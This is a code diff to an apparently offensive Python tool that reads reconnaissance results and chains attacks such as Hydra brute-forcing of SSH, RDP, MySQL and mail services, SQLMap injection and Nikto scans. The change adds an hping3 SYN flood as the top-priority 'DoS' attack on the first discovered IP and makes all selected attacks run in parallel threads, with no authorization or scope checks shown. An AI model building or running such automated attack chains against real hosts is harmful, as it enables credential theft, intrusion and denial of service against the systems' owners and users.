@@ -7,6 +7,7 @@ Reads enhanced.json and chains attacks using Hydra, SQLMap, etc.
 import os
 import sys
 import json
+import concurrent.futures
 from urllib.parse import urlparse
 
 # Add recon directory to path for utility imports
@@ -22,7 +23,7 @@ from attack_chain import (
     hydra_smtp, hydra_mysql, hydra_rdp,
     hydra_telnet, hydra_pop3, hydra_imap,
     sqlmap_url, sqlmap_form, nmap_vulnscan,
-    nikto_scan, dirb_scan
+    nikto_scan, dirb_scan, hping3_dos
 )
 
 
@@ -77,6 +78,28 @@ def load_recon_data(results_dir):
 def identify_attack_opportunities(data):
     """Analyze recon data and identify viable attack targets."""
     opportunities = []
+
+    # ─── DoS Opportunity (Top Priority) ─────────────────────────
+    # Pick the first valid IP or use domain
+    dos_target = data.get('domain')
+    for st in data.get('service_targets', []):
+        ip = st.get('target', {}).get('ip')
+        if ip:
+            dos_target = ip
+            break
+
+    if dos_target:
+        opportunities.append({
+            'type': 'dos_flood',
+            'tool': 'hping3',
+            'ip': dos_target,
+            'port': '80', 
+            'mode': 'syn',
+            'service': 'DoS Stress Test',
+            'description': f'hping3 SYN Flood on {dos_target} (30s Stress Test)',
+            'severity': 'critical',
+            'func': hping3_dos
+        })
 
     # SSH targets
     for st in data.get('service_targets', []):
@@ -394,33 +417,42 @@ def main():
         return
 
     # Execute attacks
-    section_header("Executing Attacks")
+    max_threads = os.cpu_count() or 4
+    section_header(f"Executing Attacks (Parallel: {max_threads} threads)")
     output_dir = os.path.join(results_dir, domain, 'BruteForce')
     os.makedirs(output_dir, exist_ok=True)
 
     results = []
     total = len(selected)
-    for count, idx in enumerate(selected, 1):
-        opp = opportunities[idx]
-        console.print()
-        section_header(f"Attack [{count}/{total}]: {opp['tool']} -- {opp['service']}")
-        status_msg(f"{opp['description']}")
+    
+    # Run in parallel
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
+        future_map = {}
+        for count, idx in enumerate(selected, 1):
+            opp = opportunities[idx]
+            # print status
+            info_msg(f"Queued [{count}/{total}]: {opp['tool']} -- {opp['service']}")
+            future = executor.submit(opp['func'], opp, output_dir)
+            future_map[future] = opp
+            
+        # Collect results as they finish
+        for future in concurrent.futures.as_completed(future_map):
+            opp = future_map[future]
+            try:
+                result = future.result()
+                results.append({'opportunity': opp['description'], 'result': result})
 
-        try:
-            result = opp['func'](opp, output_dir)
-            results.append({'opportunity': opp['description'], 'result': result})
+                if result.get('success'):
+                    success_msg(f"COMPLETED: {opp['tool']} - {opp.get('service')} -- {result.get('message', 'Done')}")
+                else:
+                    warning_msg(f"COMPLETED: {opp['tool']} - {opp.get('service')} -- {result.get('message', 'No findings')}")
 
-            if result.get('success'):
-                success_msg(f"Attack completed: {result.get('message', 'Done')}")
-            else:
-                warning_msg(f"Attack returned: {result.get('message', 'No results')}")
+                if result.get('output_file'):
+                    info_msg(f"Output saved: {result['output_file']}")
 
-            if result.get('output_file'):
-                info_msg(f"Output saved: {result['output_file']}")
-
-        except Exception as e:
-            error_msg(f"Attack failed: {e}")
-            results.append({'opportunity': opp['description'], 'error': str(e)})
+            except Exception as e:
+                error_msg(f"Attack failed: {e}")
+                results.append({'opportunity': opp['description'], 'error': str(e)})
 
     # Save results
     results_file = os.path.join(output_dir, 'brute_results.json')
